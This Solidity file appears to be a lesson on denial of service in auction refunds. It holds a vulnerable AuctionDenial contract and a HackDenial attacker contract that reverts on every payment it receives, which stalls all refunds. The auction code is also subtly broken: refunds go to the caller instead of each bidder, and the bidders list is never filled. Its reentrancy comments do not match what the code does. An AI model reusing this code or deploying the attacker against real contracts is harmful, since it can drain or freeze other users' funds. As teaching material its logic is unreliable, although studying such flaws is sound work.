// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract AuctionDenial {
    mapping(address bidder => uint bid) public bids;
    address[] public bidders;

    function bid() external payable {
        bids[msg.sender] +=msg.value;
    }

    //Push pattern
    function refund() external {
        for(uint i = 0; i < bidders.length; ++i)
        {
            address currentBidder = bidders[i];

            uint refundAmount = bids[currentBidder];

            bids[currentBidder] = 0;

            if(refundAmount > 0) {

            //Reentracny is not possible with this code;
            bids[msg.sender] = 0;
            
            (bool ok,) = msg.sender.call{value: refundAmount}("");
            require(ok, "can't send");
            //All funds can be stolen by reentrancy attack
            //bids[msg.sender] = 0; 

            //Ok to do this
            //bids[msg.sender] -= refundAmount;
        }
        }
        
    }
}

contract HackDenial {
    AuctionDenial toHack;
    uint constant BID_AMOUNT = 100;

    bool isHackingEnabled = true;

    constructor(address _toHack) payable {
        require(msg.value == BID_AMOUNT);

        toHack = AuctionDenial(_toHack);
        toHack.bid{value: msg.value}();
    }

    function disableHacking() external {
        isHackingEnabled = false;
    }


    receive() external payable {
        if(isHackingEnabled) {
            assert(false);
        }
    }
}